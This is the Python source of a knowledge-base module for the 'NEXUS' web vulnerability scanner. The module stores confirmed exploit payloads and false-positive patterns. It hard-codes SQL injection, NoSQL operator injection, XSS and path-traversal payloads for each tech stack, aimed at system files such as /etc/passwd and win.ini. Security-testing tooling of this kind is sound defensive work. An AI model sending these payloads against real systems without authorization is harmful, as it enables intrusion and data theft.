"""
knowledge.py — Persistent knowledge base for NEXUS scanner.

Records:
  - What payloads actually worked (confirmed by exploitation) per tech stack
  - False positive patterns to suppress per check ID
  - Tech-stack-specific attack preferences
  - Scan session learnings

CAI-style learning: each confirmed finding updates the knowledge base so
future scans against similar targets skip dead-ends and go straight to
what works.

Storage: simple JSON file at ~/.nexus/knowledge.json (auto-created).
"""
from __future__ import annotations

import json
import os
import re
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional


_KB_PATH = Path.home() / ".nexus" / "knowledge.json"


@dataclass
class ExploitRecord:
    """A confirmed, working exploit technique."""
    check_id: str
    tech_stack: str          # "dotnet-mssql", "node-mongodb", "php-mysql", etc.
    payload: str             # the exact payload that worked
    param_name: str          # parameter name it worked on
    confidence: str          # CERTAIN | FIRM
    evidence_snippet: str    # short snippet proving it worked
    timestamp: float = field(default_factory=time.time)
    target_pattern: str = ""  # regex pattern of target URL (anonymised)


@dataclass
class FalsePositiveRecord:
    """A pattern that produces false positives — suppress in future."""
    check_id: str
    reason: str              # human-readable why it's a FP
    body_pattern: str        # regex pattern in response body that indicates FP
    tech_stack: str = ""
    timestamp: float = field(default_factory=time.time)


@dataclass
class KnowledgeBase:
    exploits: list[ExploitRecord] = field(default_factory=list)
    false_positives: list[FalsePositiveRecord] = field(default_factory=list)
    scan_count: int = 0
    last_updated: float = field(default_factory=time.time)


# ---------------------------------------------------------------------------
# Built-in false positive suppressors (seeded from analysis)
# ---------------------------------------------------------------------------

_BUILTIN_FP: list[FalsePositiveRecord] = [
    # Rate limit: 404 endpoint = not a real finding
    FalsePositiveRecord(
        check_id="rate-limit-missing",
        reason="All responses 404 — endpoint does not exist",
        body_pattern=r"(?i)not found|404",
        tech_stack="*",
    ),
    # XSS: canary only appears as text inside <p> or plain div (not executable)
    FalsePositiveRecord(
        check_id="xss-reflected",
        reason="Canary reflected as plain text, not in executable HTML context",
        body_pattern=r"<p[^>]*>(?:[^<]|\s)*NEXUS_",
        tech_stack="*",
    ),
    # SQLi: generic 500 page that echoes back the value in error message
    FalsePositiveRecord(
        check_id="sqli-error",
        reason="500 response echoes input in generic error, not a DB error",
        body_pattern=r"(?i)invalid input|please enter a valid|bad request",
        tech_stack="*",
    ),
    # Path traversal: 500 means file not found, not traversal success
    FalsePositiveRecord(
        check_id="traversal-lfi",
        reason="500 response = file not found, not traversal success",
        body_pattern=r"(?i)file not found|no such file",
        tech_stack="*",
    ),
    # HPP: canary appears in URL echo (e.g. "you searched for: NEXUS_xxx")
    FalsePositiveRecord(
        check_id="http-param-pollution",
        reason="Canary echoed in search/input reflection, not actual HPP",
        body_pattern=r"(?i)you searched for|search results for|searched:",
        tech_stack="*",
    ),
    # OAuth: 302→homepage is not a real authorize endpoint
    FalsePositiveRecord(
        check_id="oauth",
        reason="302 redirect to homepage — OAuth authorize endpoint does not exist",
        body_pattern=r"",  # detected by status + redirect, not body
        tech_stack="*",
    ),
    # Clickjacking: HTTPS redirect pages don't need framing protection
    FalsePositiveRecord(
        check_id="clickjacking",
        reason="Redirect page — no meaningful UI to clickjack",
        body_pattern=r"(?i)moved permanently|temporarily moved",
        tech_stack="*",
    ),
]


# ---------------------------------------------------------------------------
# Tech-stack-specific attack strategies
# ---------------------------------------------------------------------------

TECH_STRATEGIES: dict[str, dict] = {
    # Microsoft ASP.NET + MSSQL
    "dotnet-mssql": {
        "sqli_payloads": [
            "' OR '1'='1",
            "'; WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "sqli_extractor": "SELECT TOP 1 name FROM sysobjects WHERE xtype='U'",
        "error_patterns": [
            r"Unclosed quotation mark",
            r"SQL Server",
            r"OLE DB.*error",
            r"ODBC.*Error",
            r"Incorrect syntax near",
            r"Conversion failed when converting",
        ],
        "xss_vectors": ["<script>", "onerror=", "onload="],
        "traversal_files": [
            "../../../../windows/system32/drivers/etc/hosts",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        ],
        "skip_checks": ["nosql-login", "nosql-reviews", "prototype-pollution", "ssjs-injection"],
        "priority_checks": ["sqli-error", "sqli-union", "sqli-auth-bypass", "traversal-lfi",
                            "xss-reflected", "sqli-time"],
    },
    # PHP + MySQL
    "php-mysql": {
        "sqli_payloads": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL-- -",
            "' AND SLEEP(5)--",
        ],
        "sqli_extractor": "SELECT version()",
        "error_patterns": [
            r"You have an error in your SQL syntax",
            r"mysql_fetch",
            r"MySQL server",
            r"Warning: mysql",
        ],
        "traversal_files": [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../etc/passwd",
        ],
        "skip_checks": ["nosql-login", "cve-2022-22965-spring4shell", "cve-2021-44228-log4shell"],
        "priority_checks": ["sqli-error", "sqli-union", "xss-reflected", "traversal-lfi",
                            "sqli-auth-bypass", "csrf"],
    },
    # Node.js + MongoDB
    "node-mongodb": {
        "sqli_payloads": [],  # Not applicable
        "error_patterns": [r"MongoError", r"MongoDB"],
        "nosql_payloads": [
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$ne": null}',
        ],
        "skip_checks": ["sqli-error", "sqli-union", "sqli-time", "xxe-b2b",
                        "cve-2017-5638-struts-ognl", "cve-2022-22965-spring4shell"],
        "priority_checks": ["nosql-login", "xss-reflected", "prototype-pollution",
                            "ssjs-injection", "jwt-unsigned", "bola"],
    },
    # Java + Spring
    "java-spring": {
        "sqli_payloads": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
        ],
        "error_patterns": [r"org\.springframework", r"java\.lang", r"Hibernate"],
        "traversal_files": ["../../../../etc/passwd", "../../../../etc/hosts"],
        "skip_checks": ["nosql-login", "prototype-pollution", "ssjs-injection"],
        "priority_checks": ["cve-2022-22965-spring4shell", "cve-2021-44228-log4shell",
                            "sqli-error", "xss-reflected", "ssrf-generic"],
    },
}


def _infer_tech_key(runtime: str, database: str) -> str:
    """Map (runtime, database) → strategy key."""
    if runtime in ("dotnet",) or database in ("mssql",):
        return "dotnet-mssql"
    if runtime in ("php",) and database in ("mysql", "unknown"):
        return "php-mysql"
    if runtime in ("node",) and database in ("mongodb", "unknown"):
        return "node-mongodb"
    if runtime in ("java",):
        return "java-spring"
    return "php-mysql"  # default fallback


# ---------------------------------------------------------------------------
# KnowledgeStore — singleton file-backed store
# ---------------------------------------------------------------------------

class KnowledgeStore:
    """
    File-backed knowledge base. Loads on first access, saves on update.
    Thread-safe for single-process use (no concurrent scans).
    """
    _instance: Optional["KnowledgeStore"] = None

    def __init__(self):
        self._kb = self._load()

    @classmethod
    def get(cls) -> "KnowledgeStore":
        if cls._instance is None:
            cls._instance = KnowledgeStore()
        return cls._instance

    # ── Persistence ──────────────────────────────────────────────────────────

    def _load(self) -> KnowledgeBase:
        if _KB_PATH.exists():
            try:
                data = json.loads(_KB_PATH.read_text())
                exploits = [ExploitRecord(**e) for e in data.get("exploits", [])]
                fps = [FalsePositiveRecord(**f) for f in data.get("false_positives", [])]
                return KnowledgeBase(
                    exploits=exploits,
                    false_positives=fps,
                    scan_count=data.get("scan_count", 0),
                    last_updated=data.get("last_updated", 0),
                )
            except Exception:
                pass
        return KnowledgeBase()

    def save(self):
        _KB_PATH.parent.mkdir(parents=True, exist_ok=True)
        self._kb.last_updated = time.time()
        data = {
            "exploits": [asdict(e) for e in self._kb.exploits],
            "false_positives": [asdict(f) for f in self._kb.false_positives],
            "scan_count": self._kb.scan_count,
            "last_updated": self._kb.last_updated,
        }
        _KB_PATH.write_text(json.dumps(data, indent=2))

    # ── Learning API ─────────────────────────────────────────────────────────

    def record_exploit(
        self,
        check_id: str,
        tech_stack: str,
        payload: str,
        param_name: str,
        confidence: str,
        evidence_snippet: str,
        target_url: str = "",
    ):
        """Record a confirmed, working exploit."""
        # Anonymise target URL (strip path, keep only domain pattern)
        target_pattern = ""
        if target_url:
            from urllib.parse import urlparse
            p = urlparse(target_url)
            target_pattern = p.netloc

        rec = ExploitRecord(
            check_id=check_id,
            tech_stack=tech_stack,
            payload=payload,
            param_name=param_name,
            confidence=confidence,
            evidence_snippet=evidence_snippet[:200],
            target_pattern=target_pattern,
        )
        # Deduplicate by (check_id, tech_stack, payload)
        existing = [e for e in self._kb.exploits
                    if e.check_id == check_id
                    and e.tech_stack == tech_stack
                    and e.payload == payload]
        if not existing:
            self._kb.exploits.append(rec)
            self.save()

    def record_false_positive(
        self,
        check_id: str,
        reason: str,
        body_pattern: str,
        tech_stack: str = "*",
    ):
        """Record a new false positive pattern."""
        rec = FalsePositiveRecord(
            check_id=check_id,
            reason=reason,
            body_pattern=body_pattern,
            tech_stack=tech_stack,
        )
        existing = [f for f in self._kb.false_positives
                    if f.check_id == check_id and f.body_pattern == body_pattern]
        if not existing:
            self._kb.false_positives.append(rec)
            self.save()

    def increment_scan_count(self):
        self._kb.scan_count += 1
        self.save()

    # ── Query API ─────────────────────────────────────────────────────────────

    def is_false_positive(self, check_id: str, response_body: str, tech_stack: str = "*") -> tuple[bool, str]:
        """
        Check if a finding matches a known FP pattern.
        Returns (is_fp, reason).
        """
        all_fps = _BUILTIN_FP + self._kb.false_positives
        for fp in all_fps:
            if fp.check_id != check_id:
                continue
            if fp.tech_stack not in (tech_stack, "*"):
                continue
            if fp.body_pattern and re.search(fp.body_pattern, response_body, re.I):
                return True, fp.reason
        return False, ""

    def get_proven_payloads(self, check_id: str, tech_stack: str) -> list[str]:
        """
        Return previously confirmed working payloads for this check + stack.
        These should be tried FIRST in future scans.
        """
        proven = [
            e.payload for e in self._kb.exploits
            if e.check_id == check_id and e.tech_stack == tech_stack
        ]
        return proven

    def get_strategy(self, runtime: str, database: str) -> dict:
        """Return the attack strategy for this tech stack."""
        key = _infer_tech_key(runtime, database)
        return TECH_STRATEGIES.get(key, {})

    def get_skip_checks(self, runtime: str, database: str) -> set[str]:
        """Checks to skip entirely for this tech stack."""
        strategy = self.get_strategy(runtime, database)
        return set(strategy.get("skip_checks", []))

    def get_priority_checks(self, runtime: str, database: str) -> list[str]:
        """Checks to run first for this tech stack."""
        strategy = self.get_strategy(runtime, database)
        return strategy.get("priority_checks", [])

    def stats(self) -> dict:
        return {
            "scans": self._kb.scan_count,
            "confirmed_exploits": len(self._kb.exploits),
            "fp_patterns": len(self._kb.false_positives) + len(_BUILTIN_FP),
            "last_updated": self._kb.last_updated,
        }
